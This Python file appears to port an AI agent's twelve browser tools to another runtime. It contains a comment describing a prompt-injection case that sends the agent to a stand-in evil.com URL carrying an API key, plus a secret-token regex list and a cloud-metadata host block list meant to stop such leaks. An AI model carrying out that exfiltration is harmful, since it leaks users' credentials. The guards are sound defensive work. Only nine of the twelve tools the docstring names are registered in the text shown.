"""Browser tool suite — apple-to-apple port of hermes-agent's 12 agent-facing
browser tools (reference/hermes-agent/tools/browser_tool.py + browser_cdp_tool.py
+ browser_dialog_tool.py), re-implemented against LunaMoth's runtime.

The 12 tools: browser_navigate, browser_snapshot, browser_click, browser_type,
browser_scroll, browser_back, browser_press, browser_get_images, browser_vision,
browser_console (+JS-eval mode), browser_cdp, browser_dialog.

ALL schemas MATCH hermes byte-for-byte (the model is post-trained on these
shapes). The injected session key is internal (``task_id``, default
``"default"``), NEVER part of any schema. Every tool returns a JSON string with
``success: bool``.

Driver: the external Node CLI ``agent-browser`` (see ``_browser_driver``),
shelled out per call via ``ctx.run_terminal``; page state lives in a long-lived
agent-browser daemon keyed by ``--session <name>``. The whole toolset is gated
on ``is_browser_available()`` (agent-browser CLI + Chromium present) so an
absent driver hides the tools rather than failing at runtime.

The accessibility-snapshot model (the core UX): agent-browser serializes the
page via Playwright ``ariaSnapshot`` into compact text; interactive elements
carry ``@eN`` ref ids. Flow = snapshot → act-by-ref (``browser_click("@e5")``);
handlers auto-prefix ``@``. browser_navigate auto-returns a compact snapshot so
the model can act immediately.

OS-JAIL: a real Chromium will NOT launch under LunaMoth's default sandbox-exec /
bwrap isolation — the browser toolpack needs ``dir``/``docker`` isolation +
``--no-sandbox`` (the driver injects the latter when root/AppArmor). See
``_browser_driver`` for the full flag.

NOTE on toolset: per the porting brief all 12 share the ``"browser"`` toolset
and the single ``is_browser_available`` gate. (hermes split browser_cdp /
browser_dialog into a ``browser-cdp`` toolset behind a separate CDP-endpoint
check; LunaMoth has no CDP supervisor, so browser_cdp/browser_dialog here drive
the same agent-browser CLI — its ``cdp`` verb and dialog handling — and share
the one availability gate.)
"""
from __future__ import annotations

import json
import re
import urllib.parse
from typing import Any, Optional

from ..registry import registry, tool_error
from . import _browser_driver as drv

# Secret-exfil guard regex — ported from hermes agent/redact._PREFIX_RE /
# _PREFIX_PATTERNS. A prompt injection could trick the chara into navigating to
# https://evil.com/steal?key=sk-ant-... to exfiltrate a secret; block those.
_PREFIX_PATTERNS = [
    r"sk-[A-Za-z0-9_-]{10,}",
    r"ghp_[A-Za-z0-9]{10,}",
    r"github_pat_[A-Za-z0-9_]{10,}",
    r"gho_[A-Za-z0-9]{10,}",
    r"ghu_[A-Za-z0-9]{10,}",
    r"ghs_[A-Za-z0-9]{10,}",
    r"ghr_[A-Za-z0-9]{10,}",
    r"xox[baprs]-[A-Za-z0-9-]{10,}",
    r"AIza[A-Za-z0-9_-]{30,}",
    r"pplx-[A-Za-z0-9]{10,}",
    r"fal_[A-Za-z0-9_-]{10,}",
    r"fc-[A-Za-z0-9]{10,}",
    r"bb_live_[A-Za-z0-9_-]{10,}",
    r"gAAAA[A-Za-z0-9_=-]{20,}",
    r"AKIA[A-Z0-9]{16}",
    r"sk_live_[A-Za-z0-9]{10,}",
    r"sk_test_[A-Za-z0-9]{10,}",
    r"rk_live_[A-Za-z0-9]{10,}",
    r"SG\.[A-Za-z0-9_-]{10,}",
    r"hf_[A-Za-z0-9]{10,}",
    r"r8_[A-Za-z0-9]{10,}",
    r"npm_[A-Za-z0-9]{10,}",
    r"pypi-[A-Za-z0-9_-]{10,}",
    r"dop_v1_[A-Za-z0-9]{10,}",
    r"doo_v1_[A-Za-z0-9]{10,}",
    r"am_[A-Za-z0-9_-]{10,}",
    r"sk_[A-Za-z0-9_]{10,}",
    r"tvly-[A-Za-z0-9]{10,}",
    r"exa_[A-Za-z0-9]{10,}",
    r"gsk_[A-Za-z0-9]{10,}",
    r"syt_[A-Za-z0-9]{10,}",
    r"retaindb_[A-Za-z0-9]{10,}",
    r"hsk-[A-Za-z0-9]{10,}",
    r"mem0_[A-Za-z0-9]{10,}",
    r"brv_[A-Za-z0-9]{10,}",
    r"xai-[A-Za-z0-9]{30,}",
]
_PREFIX_RE = re.compile(
    r"(?<![A-Za-z0-9_-])(" + "|".join(_PREFIX_PATTERNS) + r")(?![A-Za-z0-9_-])"
)

# Cloud-metadata / IMDS endpoints — always blocked regardless of backend
# (hermes _is_always_blocked_url): no legitimate browser use, and routing them
# to a local Chromium exfiltrates IAM credentials on EC2/GCP/Azure hosts.
_ALWAYS_BLOCKED_HOSTS = {
    "169.254.169.254",
    "metadata.google.internal",
    "metadata",
    "169.254.170.2",  # ECS task metadata
    "100.100.100.200",  # Alibaba metadata
}

_TASK_ID = "default"  # one-process-one-chara → a single internal session key


def _dumps(obj: dict[str, Any]) -> str:
    return json.dumps(obj, ensure_ascii=False)


def _has_secret(url: str) -> bool:
    decoded = urllib.parse.unquote(url)
    return bool(_PREFIX_RE.search(url) or _PREFIX_RE.search(decoded))


def _is_always_blocked_url(url: str) -> bool:
    try:
        host = (urllib.parse.urlparse(url).hostname or "").lower()
    except ValueError:
        return False
    return host in _ALWAYS_BLOCKED_HOSTS


def _normalize_url(url: str) -> str:
    url = (url or "").strip()
    if url and not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", url) and not url.startswith("about:"):
        url = "https://" + url
    return url


# ---------------------------------------------------------------------------
# Schemas (BYTE-IDENTICAL to hermes BROWSER_TOOL_SCHEMAS + CDP/dialog schemas)
# ---------------------------------------------------------------------------

NAVIGATE_SCHEMA = {
    "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
    "parameters": {
        "type": "object",
        "properties": {
            "url": {
                "type": "string",
                "description": "The URL to navigate to (e.g., 'https://example.com')",
            }
        },
        "required": ["url"],
    },
}

SNAPSHOT_SCHEMA = {
    "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
    "parameters": {
        "type": "object",
        "properties": {
            "full": {
                "type": "boolean",
                "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                "default": False,
            }
        },
        "required": [],
    },
}

CLICK_SCHEMA = {
    "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
    "parameters": {
        "type": "object",
        "properties": {
            "ref": {
                "type": "string",
                "description": "The element reference from the snapshot (e.g., '@e5', '@e12')",
            }
        },
        "required": ["ref"],
    },
}

TYPE_SCHEMA = {
    "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
    "parameters": {
        "type": "object",
        "properties": {
            "ref": {
                "type": "string",
                "description": "The element reference from the snapshot (e.g., '@e3')",
            },
            "text": {
                "type": "string",
                "description": "The text to type into the field",
            },
        },
        "required": ["ref", "text"],
    },
}

SCROLL_SCHEMA = {
    "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
    "parameters": {
        "type": "object",
        "properties": {
            "direction": {
                "type": "string",
                "enum": ["up", "down"],
                "description": "Direction to scroll",
            }
        },
        "required": ["direction"],
    },
}

BACK_SCHEMA = {
    "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
    "parameters": {"type": "object", "properties": {}, "required": []},
}

PRESS_SCHEMA = {
    "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
    "parameters": {
        "type": "object",
        "properties": {
            "key": {
                "type": "string",
                "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')",
            }
        },
        "required": ["key"],
    },
}

GET_IMAGES_SCHEMA = {
    "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
    "parameters": {"type": "object", "properties": {}, "required": []},
}

VISION_SCHEMA = {
    "description": "Take a screenshot of the current page so you can inspect it visually. Use this when you need to understand what the page looks like - especially for CAPTCHAs, visual verification challenges, complex layouts, or cases where the text snapshot misses important visual information. When your active model has native vision, the screenshot is attached to your context directly and you inspect it on the next turn; otherwise Hermes falls back to an auxiliary vision model and returns a text analysis. Includes a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate first.",
    "parameters": {
        "type": "object",
        "properties": {
            "question": {
                "type": "string",
                "description": "What you want to know about the page visually. Be specific about what you're looking for.",
            },
            "annotate": {
                "type": "boolean",
                "default": False,
                "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout.",
            },
        },
        "required": ["question"],
    },
}

CONSOLE_SCHEMA = {
    "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
    "parameters": {
        "type": "object",
        "properties": {
            "clear": {
                "type": "boolean",
                "default": False,
                "description": "If true, clear the message buffers after reading",
            },
            "expression": {
                "type": "string",
                "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'",
            },
        },
        "required": [],
    },
}

CDP_DOCS_URL = "https://chromedevtools.github.io/devtools-protocol"

CDP_SCHEMA = {
    "description": (
        "Send a raw Chrome DevTools Protocol (CDP) command. Escape hatch for "
        "browser operations not covered by browser_navigate, browser_click, "
        "browser_console, etc.\n\n"
        "**Requires a reachable CDP endpoint.** Available when the user has "
        "run '/browser connect' to attach to a running Chrome, Brave, Chromium, "
        "or Edge browser, or when 'browser.cdp_url' is set in config.yaml. "
        "Not currently wired up for cloud backends (Browserbase, Browser Use, "
        "Firecrawl) — those expose CDP per session but live-session routing is "
        "a follow-up. Camofox is REST-only and will never support CDP. If the "
        "tool is in your toolset at all, a CDP endpoint is already reachable.\n\n"
        f"**CDP method reference:** {CDP_DOCS_URL} — use web_extract on a "
        "method's URL (e.g. '/tot/Page/#method-handleJavaScriptDialog') "
        "to look up parameters and return shape.\n\n"
        "**Common patterns:**\n"
        "- List tabs: method='Target.getTargets', params={}\n"
        "- Handle a native JS dialog: method='Page.handleJavaScriptDialog', "
        "params={'accept': true, 'promptText': ''}, target_id=<tabId>\n"
        "- Get all cookies: method='Network.getAllCookies', params={}\n"
        "- Eval in a specific tab: method='Runtime.evaluate', "
        "params={'expression': '...', 'returnByValue': true}, "
        "target_id=<tabId>\n"
        "- Set viewport for a tab: method='Emulation.setDeviceMetricsOverride', "
        "params={'width': 1280, 'height': 720, 'deviceScaleFactor': 1, "
        "'mobile': false}, target_id=<tabId>\n\n"
        "**Usage rules:**\n"
        "- Browser-level methods (Target.*, Browser.*, Storage.*): omit "
        "target_id and frame_id.\n"
        "- Page-level methods (Page.*, Runtime.*, DOM.*, Emulation.*, "
        "Network.* scoped to a tab): pass target_id from Target.getTargets.\n"
        "- **Cross-origin iframe scope** (Runtime.evaluate inside an OOPIF, "
        "Page.* targeting a frame target, etc.): pass frame_id from the "
        "browser_snapshot frame_tree output. This routes through the CDP "
        "supervisor's live connection — the only reliable way on "
        "Browserbase where stateless CDP calls hit signed-URL expiry.\n"
        "- Each stateless call (without frame_id) is independent — sessions "
        "and event subscriptions do not persist between calls. For stateful "
        "workflows, prefer the dedicated browser tools or use frame_id "
        "routing."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "method": {
                "type": "string",
                "description": (
                    "CDP method name, e.g. 'Target.getTargets', "
                    "'Runtime.evaluate', 'Page.handleJavaScriptDialog'."
                ),
            },
            "params": {
                "type": "object",
                "description": (
                    "Method-specific parameters as a JSON object. Omit or "
                    "pass {} for methods that take no parameters."
                ),
                "properties": {},
                "additionalProperties": True,
            },
            "target_id": {
                "type": "string",
                "description": (
                    "Optional. Target/tab ID from Target.getTargets result "
                    "(each entry's 'targetId'). Use for page-level methods "
                    "at the top-level tab scope. Mutually exclusive with "
                    "frame_id."
                ),
            },
            "frame_id": {
                "type": "string",
                "description": (
                    "Optional. Out-of-process iframe (OOPIF) frame_id from "
                    "browser_snapshot.frame_tree.children[] where "
                    "is_oopif=true. When set, routes the call through the "
                    "CDP supervisor's live session for that iframe. "
                    "Essential for Runtime.evaluate inside cross-origin "
                    "iframes, especially on Browserbase where fresh "
                    "per-call CDP connections can't keep up with signed "
                    "URL rotation. For same-origin iframes, use parent "
                    "contentWindow/contentDocument from Runtime.evaluate "
                    "at the top-level page instead."
                ),
            },
            "timeout": {
                "type": "number",
                "description": "Timeout in seconds (default 30, max 300).",
                "default": 30,
            },
        },
        "required": ["method"],
    },
}

DIALOG_SCHEMA = {
    "description": (
        "Respond to a native JavaScript dialog (alert / confirm / prompt / "
        "beforeunload) that is currently blocking the page.\n\n"
        "**Workflow:** call ``browser_snapshot`` first — if a dialog is open, "
        "it appears in the ``pending_dialogs`` field with ``id``, ``type``, "
        "and ``message``. Then call this tool with ``action='accept'`` or "
        "``action='dismiss'``.\n\n"
        "**Prompt dialogs:** pass ``prompt_text`` to supply the response "
        "string. Ignored for alert/confirm/beforeunload.\n\n"
        "**Multiple dialogs:** if more than one dialog is queued (rare — "
        "happens when a second dialog fires while the first is still open), "
        "pass ``dialog_id`` from the snapshot to disambiguate.\n\n"
        "**Availability:** only present when a CDP-capable backend is "
        "attached — Browserbase sessions, local Chromium-family browser via "
        "``/browser connect``, or ``browser.cdp_url`` in config.yaml. "
        "Not available on Camofox (REST-only) or the default Playwright "
        "local browser (CDP port is hidden)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["accept", "dismiss"],
                "description": (
                    "'accept' clicks OK / returns the prompt text. "
                    "'dismiss' clicks Cancel / returns null from prompt(). "
                    "For ``beforeunload`` dialogs: 'accept' allows the "
                    "navigation, 'dismiss' keeps the page."
                ),
            },
            "prompt_text": {
                "type": "string",
                "description": (
                    "Response string for a ``prompt()`` dialog. Ignored for "
                    "other dialog types. Defaults to empty string."
                ),
            },
            "dialog_id": {
                "type": "string",
                "description": (
                    "Specific dialog to respond to, from "
                    "``browser_snapshot.pending_dialogs[].id``. Required "
                    "only when multiple dialogs are queued."
                ),
            },
        },
        "required": ["action"],
    },
}


# ---------------------------------------------------------------------------
# Handlers (hermes browser_tool.py) — each returns a JSON string
# ---------------------------------------------------------------------------

def browser_navigate(args: dict, ctx) -> str:
    url = str(args.get("url") or "")
    if not url:
        return _dumps({"success": False, "error": "'url' is required"})

    # Secret-exfil guard (hermes :2306).
    if _has_secret(url):
        return _dumps({"success": False, "error": (
            "Blocked: URL contains what appears to be an API key or token. "
            "Secrets must not be sent in URLs."
        )})
    url = _normalize_url(url)
    if _has_secret(url):
        return _dumps({"success": False, "error": (
            "Blocked: URL contains what appears to be an API key or token. "
            "Secrets must not be sent in URLs."
        )})

    # Always-blocked floor: cloud metadata / IMDS (hermes :2336).
    if _is_always_blocked_url(url):
        return _dumps({"success": False,
                       "error": "Blocked: URL targets a cloud metadata endpoint"})

    info = drv._ctx_sessions(ctx).get_or_create(_TASK_ID)
    is_first_nav = info.get("first_nav", True)
    info["first_nav"] = False

    timeout = max(drv._DEFAULT_COMMAND_TIMEOUT, 60)
    result = drv.run_browser_command(ctx, _TASK_ID, "open", [url], timeout=timeout)

    if not result.get("success"):
        return _dumps({"success": False, "error": result.get("error", "Navigation failed")})

    data = result.get("data", {}) or {}
    title = data.get("title", "")
    final_url = data.get("url", url)

    # Post-redirect always-blocked check (hermes :2404).
    if final_url and final_url != url and _is_always_blocked_url(final_url):
        drv.run_browser_command(ctx, _TASK_ID, "open", ["about:blank"], timeout=10)
        return _dumps({"success": False,
                       "error": "Blocked: redirect landed on a cloud metadata endpoint"})

    response: dict[str, Any] = {"success": True, "url": final_url, "title": title}

    # Bot-detection warning from title (hermes :2446).
    blocked_patterns = [
        "access denied", "access to this page has been denied", "blocked",
        "bot detected", "verification required", "please verify",
        "are you a robot", "captcha", "cloudflare", "ddos protection",
        "checking your browser", "just a moment", "attention required",
    ]
    if any(p in (title or "").lower() for p in blocked_patterns):
        response["bot_detection_warning"] = (
            f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
            "Options: 1) Try adding delays between actions, 2) Access different pages first, "
            "3) Some sites have very aggressive bot detection that may be unavoidable."
        )

    # Auto compact snapshot so the model can act immediately (hermes :2474).
    try:
        snap = drv.run_browser_command(ctx, _TASK_ID, "snapshot", ["-c"])
        if snap.get("success"):
            sdata = snap.get("data", {}) or {}
            snapshot_text = sdata.get("snapshot", "") or ""
            refs = sdata.get("refs", {}) or {}
            if len(snapshot_text) > drv.SNAPSHOT_SUMMARIZE_THRESHOLD:
                snapshot_text = drv.truncate_snapshot(snapshot_text)
            response["snapshot"] = snapshot_text
            response["element_count"] = len(refs) if refs else 0
    except Exception:  # noqa: BLE001 — snapshot is best-effort enrichment
        pass

    if is_first_nav:
        response["stealth_features"] = ["local"]
    return _dumps(response)


def browser_snapshot(args: dict, ctx) -> str:
    full = bool(args.get("full", False))
    user_task = args.get("user_task")  # internal, task-aware extraction (not in schema)
    cmd_args = [] if full else ["-c"]
    result = drv.run_browser_command(ctx, _TASK_ID, "snapshot", cmd_args)

    if not result.get("success"):
        return _dumps({"success": False, "error": result.get("error", "Failed to get snapshot")})

    data = result.get("data", {}) or {}
    snapshot_text = data.get("snapshot", "") or ""
    refs = data.get("refs", {}) or {}

    if len(snapshot_text) > drv.SNAPSHOT_SUMMARIZE_THRESHOLD and user_task:
        snapshot_text = _extract_relevant_content(snapshot_text, user_task, ctx)
    elif len(snapshot_text) > drv.SNAPSHOT_SUMMARIZE_THRESHOLD:
        snapshot_text = drv.truncate_snapshot(snapshot_text)

    response: dict[str, Any] = {
        "success": True,
        "snapshot": snapshot_text,
        "element_count": len(refs) if refs else 0,
    }
    # Surface dialog/frame state if the agent-browser snapshot carried it
    # (hermes merges supervisor state; LunaMoth reads it straight from the CLI).
    if data.get("pending_dialogs"):
        response["pending_dialogs"] = data["pending_dialogs"]
    if data.get("frame_tree"):
        response["frame_tree"] = data["frame_tree"]
    return _dumps(response)


def browser_click(args: dict, ctx) -> str:
    ref = str(args.get("ref") or "")
    if not ref:
        return _dumps({"success": False, "error": "'ref' is required"})
    if not ref.startswith("@"):
        ref = f"@{ref}"
    result = drv.run_browser_command(ctx, _TASK_ID, "click", [ref])
    if result.get("success"):
        return _dumps({"success": True, "clicked": ref})
    return _dumps({"success": False, "error": result.get("error", f"Failed to click {ref}")})


def browser_type(args: dict, ctx) -> str:
    ref = str(args.get("ref") or "")
    text = args.get("text")
    if not ref:
        return _dumps({"success": False, "error": "'ref' is required"})
    if text is None:
        return _dumps({"success": False, "error": "'text' is required"})
    if not ref.startswith("@"):
        ref = f"@{ref}"
    # fill = clears then types (hermes uses the 'fill' CLI verb).
    result = drv.run_browser_command(ctx, _TASK_ID, "fill", [ref, str(text)])
    if result.get("success"):
        return _dumps({"success": True, "typed": str(text), "element": ref})
    return _dumps({"success": False, "error": result.get("error", f"Failed to type into {ref}")})


def browser_scroll(args: dict, ctx) -> str:
    direction = str(args.get("direction") or "")
    if direction not in {"up", "down"}:
        return _dumps({"success": False,
                       "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."})
    # ~500px ≈ half a viewport, one subprocess (hermes :2664).
    result = drv.run_browser_command(ctx, _TASK_ID, "scroll", [direction, "500"])
    if result.get("success"):
        return _dumps({"success": True, "scrolled": direction})
    return _dumps({"success": False, "error": result.get("error", f"Failed to scroll {direction}")})


def browser_back(args: dict, ctx) -> str:
    result = drv.run_browser_command(ctx, _TASK_ID, "back", [])
    if result.get("success"):
        data = result.get("data", {}) or {}
        return _dumps({"success": True, "url": data.get("url", "")})
    return _dumps({"success": False, "error": result.get("error", "Failed to go back")})


def browser_press(args: dict, ctx) -> str:
    key = str(args.get("key") or "")
    if not key:
        return _dumps({"success": False, "error": "'key' is required"})
    result = drv.run_browser_command(ctx, _TASK_ID, "press", [key])
    if result.get("success"):
        return _dumps({"success": True, "pressed": key})
    return _dumps({"success": False, "error": result.get("error", f"Failed to press {key}")})


# JS that maps document.images → {src,alt,width,height}, filtering data: URLs
# (hermes :3029).
_GET_IMAGES_JS = (
    "JSON.stringify("
    "[...document.images].map(img => ({"
    "src: img.src, alt: img.alt || '', "
    "width: img.naturalWidth, height: img.naturalHeight"
    "})).filter(img => img.src && !img.src.startsWith('data:'))"
    ")"
)


def browser_get_images(args: dict, ctx) -> str:
    result = drv.run_browser_command(ctx, _TASK_ID, "eval", [_GET_IMAGES_JS])
    if not result.get("success"):
        return _dumps({"success": False, "error": result.get("error", "Failed to get images")})
    raw = (result.get("data", {}) or {}).get("result", "[]")
    try:
        images = json.loads(raw) if isinstance(raw, str) else raw
        return _dumps({"success": True, "images": images, "count": len(images)})
    except (json.JSONDecodeError, TypeError):
        return _dumps({"success": True, "images": [], "count": 0,
                       "warning": "Could not parse image data"})


def browser_vision(args: dict, ctx) -> str:
    question = str(args.get("question") or "")
    annotate = bool(args.get("annotate", False))
    if not question:
        return _dumps({"success": False, "error": "'question' is required"})

    import uuid as _uuid
    screenshots_dir = drv.Path.home() / ".lunamoth" / "cache" / "screenshots"
    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)
        _prune_old_screenshots(screenshots_dir)
    except OSError as e:
        return _dumps({"success": False, "error": f"Could not create screenshot dir: {e}"})
    screenshot_path = screenshots_dir / f"browser_screenshot_{_uuid.uuid4().hex}.png"

    cmd_args = []
    if annotate:
        cmd_args.append("--annotate")
    cmd_args += ["--full", str(screenshot_path)]
    result = drv.run_browser_command(ctx, _TASK_ID, "screenshot", cmd_args)

    if not result.get("success"):
        return _dumps({"success": False,
                       "error": f"Failed to take screenshot: {result.get('error', 'Unknown error')}"})

    actual = (result.get("data", {}) or {}).get("path")
    if actual:
        screenshot_path = drv.Path(actual)
    if not screenshot_path.exists():
        return _dumps({"success": False, "error": (
            f"Screenshot file was not created at {screenshot_path}. This may indicate a "
            "socket path issue (macOS /var/folders/), a missing Chromium install "
            "('agent-browser install'), or a stale daemon process."
        )})

    # Auxiliary vision-model analysis (hermes falls back to AUXILIARY_VISION_MODEL
    # when the active model lacks native vision; LunaMoth has one provider client).
    analysis = _vision_analyze(ctx, screenshot_path, question)
    response = {
        "success": True,
        "screenshot_path": str(screenshot_path),
    }
    if analysis is not None:
        response["analysis"] = analysis or "Vision analysis returned no content."
    else:
        # No vision-capable LLM available: still return the path so the chara can
        # surface it to the user via MEDIA:<path> (no fabricated analysis).
        response["note"] = (
            "Screenshot captured. No auxiliary vision model is configured to "
            "analyze it; share it with the user via MEDIA:" + str(screenshot_path)
        )
    return _dumps(response)


def browser_console(args: dict, ctx) -> str:
    clear = bool(args.get("clear", False))
    expression = args.get("expression")

    # JS-evaluation mode (hermes _browser_eval).
    if expression is not None:
        return _browser_eval(ctx, str(expression))

    console_args = ["--clear"] if clear else []
    console_result = drv.run_browser_command(ctx, _TASK_ID, "console", console_args)
    errors_result = drv.run_browser_command(ctx, _TASK_ID, "errors", console_args)

    messages = []
    if console_result.get("success"):
        for msg in (console_result.get("data", {}) or {}).get("messages", []) or []:
            messages.append({"type": msg.get("type", "log"),
                             "text": msg.get("text", ""), "source": "console"})
    errors = []
    if errors_result.get("success"):
        for err in (errors_result.get("data", {}) or {}).get("errors", []) or []:
            errors.append({"message": err.get("message", ""), "source": "exception"})

    return _dumps({
        "success": True,
        "console_messages": messages,
        "js_errors": errors,
        "total_messages": len(messages),
        "total_errors": len(errors),
    })


def _browser_eval(ctx, expression: str) -> str:
    result = drv.run_browser_command(ctx, _TASK_ID, "eval", [expression])
    if not result.get("success"):
        err = result.get("error", "eval failed")
        low = err.lower()
        if any(h in low for h in ("unknown command", "not supported", "not found", "no such command")):
            return _dumps({"success": False,
                           "error": f"JavaScript evaluation is not supported by this browser backend. {err}"})
        if "reference chain is too long" in low:
            return _dumps({"success": False, "error": (
                "Expression returned a live DOM node / NodeList / Window, which can't be "
                "serialized. Extract a primitive value (e.g. .innerText, .href, .src, .value) "
                "or use JSON.stringify() / a snapshot tool instead."
            )})
        return _dumps({"success": False, "error": err})

    raw = (result.get("data", {}) or {}).get("result")
    parsed = raw
    if isinstance(raw, str):
        try:
            parsed = json.loads(raw)
        except (json.JSONDecodeError, ValueError):
            pass
    return json.dumps({"success": True, "result": parsed, "result_type": type(parsed).__name__},
                      ensure_ascii=False, default=str)


def browser_cdp(args: dict, ctx) -> str:
    """Raw CDP escape hatch. hermes routes this through a persistent CDP
    WebSocket supervisor / the `websockets` package; LunaMoth has no supervisor,
    so we drive agent-browser's own `cdp` verb (it owns the live CDP connection
    to its Chromium). frame_id/target_id are forwarded as flags when given."""
    method = str(args.get("method") or "")
    if not method:
        return tool_error("'method' is required (e.g. 'Target.getTargets')",
                          cdp_docs=CDP_DOCS_URL)
    params = args.get("params") or {}
    if not isinstance(params, dict):
        return tool_error(f"'params' must be an object/dict, got {type(params).__name__}")
    target_id = args.get("target_id")
    frame_id = args.get("frame_id")
    try:
        timeout = float(args.get("timeout", 30.0) or 30.0)
    except (TypeError, ValueError):
        timeout = 30.0
    timeout = max(1.0, min(timeout, 300.0))

    cli_args = [method, "--params", json.dumps(params, ensure_ascii=False)]
    if target_id:
        cli_args += ["--target-id", str(target_id)]
    if frame_id:
        cli_args += ["--frame-id", str(frame_id)]

    result = drv.run_browser_command(ctx, _TASK_ID, "cdp", cli_args, timeout=int(timeout))
    if not result.get("success"):
        return tool_error(result.get("error", "CDP call failed"), method=method)

    payload: dict[str, Any] = {
        "success": True,
        "method": method,
        "result": (result.get("data", {}) or {}).get("result", result.get("data", {})),
    }
    if target_id:
        payload["target_id"] = target_id
    return _dumps(payload)


def browser_dialog(args: dict, ctx) -> str:
    """Respond to a native JS dialog. hermes routes this through the per-task
    CDPSupervisor; LunaMoth drives agent-browser's `dialog` verb (accept/dismiss
    + optional prompt text + dialog id)."""
    action = str(args.get("action") or "")
    if action not in {"accept", "dismiss"}:
        return _dumps({"success": False,
                       "error": "'action' must be 'accept' or 'dismiss'"})
    prompt_text = args.get("prompt_text")
    dialog_id = args.get("dialog_id")

    cli_args = [action]
    if prompt_text is not None:
        cli_args += ["--prompt-text", str(prompt_text)]
    if dialog_id is not None:
        cli_args += ["--dialog-id", str(dialog_id)]

    result = drv.run_browser_command(ctx, _TASK_ID, "dialog", cli_args)
    if result.get("success"):
        data = result.get("data", {}) or {}
        return _dumps({"success": True, "action": action, "dialog": data.get("dialog", data)})
    return _dumps({"success": False, "error": result.get("error", "unknown error")})


# ---------------------------------------------------------------------------
# Aux helpers (vision analysis / content extraction / screenshot pruning)
# ---------------------------------------------------------------------------

def _vision_analyze(ctx, screenshot_path, question: str) -> Optional[str]:
    """Analyze the screenshot via the auxiliary vision model. Returns the text
    analysis, "" for an empty completion, or None when no vision LLM is
    available (no-fallback: the caller then surfaces the raw screenshot path).
    Mirrors hermes' aux-vision call shape."""
    llm = getattr(ctx, "llm", None)
    if llm is None:
        return None
    analyze = getattr(llm, "analyze_image", None)
    if not callable(analyze):
        return None
    try:
        out = analyze(str(screenshot_path), question)
        return (out or "").strip()
    except Exception as e:  # noqa: BLE001 — real failure, but we keep the screenshot
        return f"(vision analysis failed: {e})"


def _extract_relevant_content(snapshot_text: str, user_task: str, ctx) -> str:
    """LLM-summarize an oversized snapshot against the user's task (hermes
    _extract_relevant_content). Falls back to a hard truncate when no LLM
    summarizer is wired (never fabricates)."""
    llm = getattr(ctx, "llm", None)
    summarize = getattr(llm, "summarize", None) if llm is not None else None
    if callable(summarize):
        try:
            out = summarize(snapshot_text, instruction=(
                f"Extract the page content relevant to this task: {user_task}"))
            if out:
                return out.strip()
        except Exception:  # noqa: BLE001
            pass
    return drv.truncate_snapshot(snapshot_text)


def _prune_old_screenshots(directory, max_age_hours: int = 24) -> None:
    import time
    cutoff = time.time() - max_age_hours * 3600
    try:
        for p in directory.glob("browser_screenshot_*.png"):
            try:
                if p.stat().st_mtime < cutoff:
                    p.unlink()
            except OSError:
                pass
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Registration — all 12 tools, toolset "browser", gated on is_browser_available
# ---------------------------------------------------------------------------

_GATE = drv.is_browser_available

registry.register("browser_navigate", "browser", NAVIGATE_SCHEMA, browser_navigate,
                  check_fn=_GATE, emoji="🌐")
registry.register("browser_snapshot", "browser", SNAPSHOT_SCHEMA, browser_snapshot,
                  check_fn=_GATE, emoji="📸")
registry.register("browser_click", "browser", CLICK_SCHEMA, browser_click,
                  check_fn=_GATE, emoji="🖱")
registry.register("browser_type", "browser", TYPE_SCHEMA, browser_type,
                  check_fn=_GATE, emoji="⌨")
registry.register("browser_scroll", "browser", SCROLL_SCHEMA, browser_scroll,
                  check_fn=_GATE, emoji="↕")
registry.register("browser_back", "browser", BACK_SCHEMA, browser_back,
                  check_fn=_GATE, emoji="◀")
registry.register("browser_press", "browser", PRESS_SCHEMA, browser_press,
                  check_fn=_GATE, emoji="⏎")
registry.register("browser_get_images", "browser", GET_IMAGES_SCHEMA, browser_get_images,
                  check_fn=_GATE, emoji="🖼")
registry.register("browser_vision", "browser", VISION_SCHEMA, browser_vision,
                  check_fn=_GATE, emoji="👁")
